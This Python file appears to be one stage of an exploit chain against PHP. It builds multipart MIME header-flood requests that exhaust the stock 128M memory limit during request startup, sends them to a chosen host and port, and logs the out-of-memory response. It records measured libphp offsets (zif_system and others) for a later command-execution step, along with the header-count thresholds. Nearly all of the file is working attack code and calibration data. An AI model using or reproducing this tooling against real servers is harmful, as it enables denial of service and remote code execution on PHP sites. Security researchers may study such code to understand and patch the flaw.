#!/usr/bin/env python3
# LANE: stock-128M multipart MIME header flood (adapted from WoYinDao
# `tools/exploit_128m.py`, MIT, commit a127f77009ca; see
# THIRD_PARTY_NOTICES.md). This is NOT the README stale-session-id chain
# (A1 -> B1 -> A2 -> B2 on php.ini-production targets). The "2/2" figures
# below are flood-lane arm results on official images with NO active php.ini,
# which does not reproduce the public 8.4.26 chain. In this lane 8.4.26 and
# 8.3.35 reached the upstream flood terminal; 8.5.11's 2/2 is A1+B1 leak only
# (no `uid`, no `libphp` pointer), not a full chain.
"""producer_flood.py - stock-128M producer stage: multipart MIME header flood.

Provenance: adapted from WoYinDao/CVE-2026-109618-CVSS-9.2-Critical,
`tools/exploit_128m.py` (MIT License, Copyright (c) 2026 WoYinDao), commit
a127f77009ca; reviewed snapshot 99da6fb7dd7ecd4a95cd7188d77bb7e7785012eb.
The full notice is in THIRD_PARTY_NOTICES.md. This is the only public chain
that OOMs the *stock* `memory_limit=128M` while staying under the stock
`post_max_size=8M`. The amplifier is one multipart file part carrying N
lines of `X: v\\r\\n`: 6 bytes of wire per line cost PHP ~290-305 bytes in the
multipart parser, so 500,000 lines = 3.00 MB of body exhaust 128 MB during
request startup (pre-RINIT). The fatal prints as `... in Unknown on line 0`,
which is why it is reachable before any application code runs.

This module is TRANSPORT + byte builders only. It reproduces the two flood arms
used by the upstream chain and records the OOM receipt; the terminal (9bie
fake HashTable -> zif_system over PS(http_session_vars)) stays in the upstream
chain, and the per-build offsets needed to drive it are recorded in
CHAIN_OFFSETS below.

Arms (byte-exact with upstream `build_multipart`; parity hashes in
RECEIPT_PARITY, verified against the upstream builders):
  flood  stage1 A: 1001 x 1-byte fields + PHPSESSID/upload-progress + 64-byte
         file part + flood part          -> 3,072,588 B wire (500K headers)
  spray  rotate A: 1001 x 3000-byte fields + same tail
                                        -> 6,074,587 B wire (500K headers)

Gate: the arm is calibrated for the stock default (`memory_limit=128M`, i.e. no
php.ini: the official `php:*-apache` images ship none). A configured knob
(2M/8M/...) is a *different* producer - producer_modphp's large-filename arm or
the 9bie large-body arm - so it is refused here rather than silently misfiring.
`display_errors=On` is required to see the OOM in the response body; that is
the stock image default, NOT a claim about hardened php.ini targets.

Measured 2026-10-22 (receipt flood128_20261022T091656Z), single prefork worker,
ASLR=2, official images, no php.ini:
  version   zif_system  zval_ptr_dtor  htdata    flood-lane 2/2        one-shot
  8.4.26    0x465370    0x65eb60       0x690d8   2/2 (this lane)       W3 attempt 1
  8.3.35    0x3ac080    0x49ec50       0x6a0d8   2/2 (this lane)       W3 attempt 1
  8.5.11    0x5996e0    0x7b47a0       0x690d8   2/2 A1+B1 leak only   n/a (no libphp pointer)
For 8.5.11, 2/2 means the A1 OOM plus the B1 819,208-B leak only: no
target-written `uid` and no `libphp` pointer, so the upstream terminal cannot be
driven. The no-active-php.ini condition is not the public README 8.4.26 chain
(php.ini-production, stale-session-id A1 -> B1 -> A2 -> B2).
Offsets are libphp.so-relative except htdata, which is the 2 MiB-chunk-relative
offset of the first of the 15 live 167-byte fake-HashTable strings in the
stage-3 B request (gdb scan of $_POST zend_strings on a fresh child after the
real stage-3 A). The 15 copies are 0xC0 apart (167 -> 192-byte size class).
OOM ladder at 128M (full arm with the 1001 filler fields, measured on 8.4.26
2026-10-22): 400,000/425,000 headers do NOT OOM, 430,000/500,000 do. The
response for the full arm is a 475-byte startup transcript (max_input_vars and
session-cookie warnings, then the fatal); the bare arm without fillers returns
the 149-byte fatal quoted in the older receipts.
"""

import argparse
import hashlib
import json
import re
import socket
import sys
from pathlib import Path

BOUNDARY = b"S" * 17                 # upstream flood-arm boundary
HEADER_LINE = b"X: v\r\n"            # 6 wire bytes per MIME header
DEFAULT_HEADER_COUNT = 500_000       # upstream default; 3.00 MB of headers
MAX_HEADER_COUNT = 1_000_000         # 6.0 MB of headers, still < post_max_size
FILLER_PARTS = 1001                  # upstream filler count (arms only)
POST_MAX_SIZE = 8_388_608            # stock post_max_size (no php.ini)
STOCK_MEMORY_LIMIT = "128M"          # stock memory_limit (no php.ini)
DEFAULT_PATH = "/index.php"
VARIANTS = ("flood", "spray")

OOM_MARKERS = (b"Allowed memory size of", b"exhausted")
# pre-RINIT context: the fatal points at line 0 and, with the stock
# html_errors=1, prints `<b>Unknown</b> on line <b>0</b>` (so the upstream
# `"Unknown on line 0"` substring test misses it on official images).
PRE_RINIT_MARKERS = (b"Request Startup", b"on line <b>0</b>", b"on line 0")

# per-build terminal offsets, measured on the official images (see docstring)
CHAIN_OFFSETS = {
    "8.4.26": {"zif": 0x465370, "dtor": 0x65eb60, "htdata": 0x690D8},
    "8.3.35": {"zif": 0x3AC080, "dtor": 0x49EC50, "htdata": 0x6A0D8},
    "8.5.11": {"zif": 0x5996E0, "dtor": 0x7B47A0, "htdata": 0x690D8},
}

# measured OOM ladder at stock 128M (8.4.26): header count -> OOM
LADDER_128M = {400_000: False, 425_000: False, 430_000: True, 500_000: True}

# arm-body sha256 parity, checked against the upstream builders
# (exploit_128m.Exploit.rotate A / stage1 A with the receipt sid)
RECEIPT_PARITY = {
    "flood": "336d6b9a466f57bd80cf3af9f2c044c265eec5b038644e666a911ab68fae498f",
    "spray": "ac456eff9f3051b5714db2759c7ca7233593f502fa872278135b77c36d46a628",
}
# upstream commit cited for this adaptation is a127f77009ca; 99da6fb7 is the
# reviewed snapshot recorded in the receipts below
RECEIPT = {
    "upstream": "WoYinDao/CVE-2026-109618-CVSS-9.2-Critical@99da6fb7 "
                "tools/exploit_128m.py",
    "target": "official php:8.4.26-apache, no php.ini, memory_limit=128M "
              "post_max_size=8M display_errors=On, single prefork worker",
    "outcome": "200 + 475-byte startup transcript on the full arm "
               "(max_input_vars + session warnings, then 'Allowed memory size "
               "of 134217728 bytes exhausted', tried 4096 B, in Unknown on "
               "line 0); the bare 4-part arm returns the 149-byte fatal alone",
    "amplification": "500,000 x 6 B headers = 3.00 MB wire -> 128 MB; "
                     "full-arm threshold between 425,000 and 430,000 headers",
}


def _sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def validate_header_count(count: int) -> int:
    if not isinstance(count, int) or isinstance(count, bool):
        raise TypeError("flood header count must be an int")
    if not 1 <= count <= MAX_HEADER_COUNT:
        raise ValueError(
            f"flood header count must be between 1 and {MAX_HEADER_COUNT} "
            f"(default {DEFAULT_HEADER_COUNT}; 128M OOM measured between "
            f"425,000 and 430,000)")
    return count


def validate_memory_limit(memory_limit: str | None) -> str:
    """Stock-128M gate: this arm is calibrated for the default, no knob."""
    knob = (memory_limit or "").strip()
    if not knob:
        return f"{STOCK_MEMORY_LIMIT} (stock default: no php.ini)"
    if not re.fullmatch(r"\d+[KMG]?", knob):
        raise ValueError(
            "memory_limit must be an ini size like 128M / 1024K / N bytes "
            f"(got {knob!r})")
    if knob.upper() != STOCK_MEMORY_LIMIT:
        raise ValueError(
            f"flood producer is calibrated for the stock default {STOCK_MEMORY_LIMIT} "
            f"(got {knob!r}): a configured memory_limit knob is a different "
            "producer - use producer_modphp (large-filename arm) or the 9bie "
            "large-body arm instead")
    return knob


def validate_variant(variant: str) -> str:
    if variant not in VARIANTS:
        raise ValueError(
            f"flood variant must be one of {', '.join(VARIANTS)} (got {variant!r})")
    return variant


def _multipart(parts: list[dict], boundary: bytes) -> bytes:
    """Adapted from the upstream build_multipart: same part order and formatting.

    Upstream is `tools/exploit_128m.py` in WoYinDao/CVE-2026-109618-CVSS-9.2-Critical,
    MIT, Copyright (c) 2026 WoYinDao; see THIRD_PARTY_NOTICES.md.
    """
    out = bytearray()
    for part in parts:
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + part["name"].encode() + b'"'
        if part.get("filename") is not None:
            out += b'; filename="' + part["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        if part.get("headers"):
            out += b"\r\n" + part["headers"]
        out += b"\r\n\r\n" + part["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def arm_body(header_count: int = DEFAULT_HEADER_COUNT,
             variant: str = "flood", sid: bytes = b"\x00") -> bytes:
    """Build one flood arm shaped like upstream (flood = stage1 A, spray = rotate A).

    The arm layout is adapted from the upstream builders (MIT, WoYinDao);
    see THIRD_PARTY_NOTICES.md.
    """
    validate_header_count(header_count)
    validate_variant(variant)
    if variant == "spray":
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000}
                 for i in range(FILLER_PARTS)]
    else:
        parts = [{"name": f"p{i:04d}", "data": b"x"}
                 for i in range(FILLER_PARTS)]
    parts += [
        {"name": "PHPSESSID", "data": sid},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "flood", "filename": "f.txt",
         "headers": HEADER_LINE * header_count, "data": b"Z"},
    ]
    return _multipart(parts, BOUNDARY)


def build(header_count: int = DEFAULT_HEADER_COUNT,
          variant: str = "flood") -> dict:
    body = arm_body(header_count, variant)
    header_bytes = 6 * header_count
    return {
        "body": body,
        "body_bytes": len(body),
        "header_bytes": header_bytes,
        "header_line": HEADER_LINE.decode("latin1"),
        "header_count": header_count,
        "variant": variant,
        "filler_parts": FILLER_PARTS,
        "file_parts": 1,
        "over_budget": len(body) >= POST_MAX_SIZE,
        "content_length_ok": len(body) < POST_MAX_SIZE,
        "boundary": BOUNDARY.decode("latin1"),
        "amplification": (
            "PHP-side cost ~290-305 B per 6 B header (measured threshold "
            "425K-430K at 128M (full arm)"),
    }


def request_bytes(path: str, host_header: str, body: bytes,
                  cookie_sid: str | None = None) -> bytes:
    headers = [
        f"POST {path} HTTP/1.1",
        f"Host: {host_header}",
    ]
    if cookie_sid is not None:
        headers.append(f"Cookie: PHPSESSID={cookie_sid}")
    headers += [
        "Content-Type: multipart/form-data; boundary=" + BOUNDARY.decode(),
        f"Content-Length: {len(body)}",
        "Connection: close",
    ]
    return ("\r\n".join(headers) + "\r\n\r\n").encode("ascii") + body


def has_marker(data: bytes, markers: tuple[bytes, ...]) -> bool:
    return any(marker in data for marker in markers)


def dry(host_header: str, header_count: int, output: Path,
        memory_limit: str | None = None, variant: str = "flood") -> dict:
    """Offline stage: build + record the exact request bytes, zero sockets."""
    knob = validate_memory_limit(memory_limit)
    built = build(header_count, variant)
    body = built.pop("body")
    request = request_bytes(DEFAULT_PATH, host_header, body)
    output.mkdir(parents=True, exist_ok=True)
    artifacts = {
        "flood-arm-request.bin": request,
        "flood-arm-body.bin": body,
    }
    artifacts_meta = {}
    for name, data in artifacts.items():
        (output / name).write_bytes(data)
        artifacts_meta[name[:-4].replace("-", "_")] = {
            "bytes": len(data),
            "sha256": _sha(data),
        }
    return {
        "stage": "producer",
        "producer_stage": "producer_flood",
        "dry_run": True,
        "sent": False,
        "memory_limit": knob,
        "display_errors": "On required (stock image default: no php.ini)",
        "body_bytes": built["body_bytes"],
        "header_count": built["header_count"],
        "header_bytes": built["header_bytes"],
        "variant": built["variant"],
        "over_budget": built["over_budget"],
        "post_max_size": POST_MAX_SIZE,
        "boundary": built["boundary"],
        "amplification": built["amplification"],
        "ladder_128m": {str(k): v for k, v in LADDER_128M.items()},
        "chain_offsets": CHAIN_OFFSETS,
        "receipt": RECEIPT,
        "artifacts": artifacts_meta,
    }


def fire(host: str, port: int, header_count: int, output: Path,
         memory_limit: str | None = None, timeout: float = 120.0,
         path: str = DEFAULT_PATH, variant: str = "flood",
         cookie_sid: str | None = None) -> dict:
    """Send one flood arm to the supplied target; record the OOM receipt."""
    import time

    try:
        from tool.modules import arm
    except ModuleNotFoundError:  # script mode: repo root is not on sys.path
        import importlib.util
        spec = importlib.util.spec_from_file_location(
            "tool_arm", Path(__file__).resolve().parent / "arm.py")
        arm = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(arm)

    knob = validate_memory_limit(memory_limit)
    built = build(header_count, variant)
    body = built.pop("body")
    if built["over_budget"]:
        raise ValueError(
            f"flood arm {built['body_bytes']} bytes reaches post_max_size "
            f"{POST_MAX_SIZE}: the request is rejected before the parser runs")
    request = request_bytes(path, f"{host}:{port}", body, cookie_sid)
    started = time.monotonic()
    with socket.create_connection((host, port), timeout=timeout) as connection:
        connection.settimeout(timeout)
        connection.sendall(request)
        response, decoded, headers, status = arm.read_response(
            connection.makefile("rb", buffering=0))
    wall_ms = round((time.monotonic() - started) * 1000, 1)

    output.mkdir(parents=True, exist_ok=True)
    artifacts = {
        "flood-arm-request.bin": request,
        "flood-arm-response.bin": response,
        "flood-arm-body.bin": decoded,
    }
    artifacts_meta = {}
    for name, data in artifacts.items():
        (output / name).write_bytes(data)
        artifacts_meta[name[:-4].replace("-", "_")] = {
            "bytes": len(data),
            "sha256": _sha(data),
        }
    oom = has_marker(decoded, OOM_MARKERS)
    pre_rinit = has_marker(decoded, PRE_RINIT_MARKERS)
    trial = re.search(rb"tried to allocate (\d+) bytes", decoded)
    summary = {
        "stage": "producer",
        "producer_stage": "producer_flood",
        "dry_run": False,
        "sent": True,
        "host": host,
        "port": port,
        "path": path,
        "memory_limit": knob,
        "display_errors": "On required (stock image default: no php.ini)",
        "body_bytes": built["body_bytes"],
        "header_count": built["header_count"],
        "header_bytes": built["header_bytes"],
        "variant": built["variant"],
        "post_max_size": POST_MAX_SIZE,
        "status": status,
        "response_body_bytes": len(decoded),
        "oom_receipt": oom,
        "pre_rinit": pre_rinit,
        "tried_to_allocate": int(trial.group(1)) if trial else None,
        "markers": [
            {"marker": marker.decode("latin1"),
             "offset": decoded.find(marker)}
            for marker in OOM_MARKERS + PRE_RINIT_MARKERS
            if decoded.find(marker) >= 0
        ],
        "wall_ms": wall_ms,
        "receipt": RECEIPT,
        "artifacts": artifacts_meta,
    }
    return summary


def parity(header_count: int = DEFAULT_HEADER_COUNT) -> dict:
    """Compare the built arm against the recorded upstream sha256 receipts."""
    out = {}
    for variant, expected in RECEIPT_PARITY.items():
        actual = _sha(arm_body(header_count, variant))
        out[variant] = {
            "sha256": actual,
            "expected": expected,
            "match": actual == expected,
        }
    return out


def main() -> int:
    parser = argparse.ArgumentParser(
        description="flood producer stage: 128M header-flood arm (stock "
                    "memory_limit) against the supplied target")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8080)
    parser.add_argument("--path", default=DEFAULT_PATH)
    parser.add_argument("--flood-headers", type=int, default=DEFAULT_HEADER_COUNT,
                        help="number of X: v headers in the file part "
                             f"(default {DEFAULT_HEADER_COUNT}; 128M OOM "
                             "measured between 425000 and 430000 (full arm)")
    parser.add_argument("--variant", choices=VARIANTS, default="flood")
    parser.add_argument("--memory-limit", default=None,
                        help="server-side memory_limit; only stock 128M (or "
                             "absent) is accepted")
    parser.add_argument("--cookie-sid", default=None,
                        help="optional 32-hex PHPSESSID Cookie header (stage-3 "
                             "A carries one upstream)")
    parser.add_argument("--timeout", type=float, default=120.0)
    parser.add_argument("--dry", action="store_true",
                        help="build + record the request bytes, send nothing")
    parser.add_argument("--output", required=True, type=Path)
    args = parser.parse_args()
    if args.dry:
        summary = dry(f"{args.host}:{args.port}", args.flood_headers,
                      args.output, args.memory_limit, args.variant)
    else:
        summary = fire(args.host, args.port, args.flood_headers, args.output,
                       args.memory_limit, timeout=args.timeout, path=args.path,
                       variant=args.variant, cookie_sid=args.cookie_sid)
    (args.output / "result.json").write_text(
        json.dumps(summary, indent=2, sort_keys=True) + "\n")
    print(json.dumps({k: v for k, v in summary.items() if k != "artifacts"},
                     indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
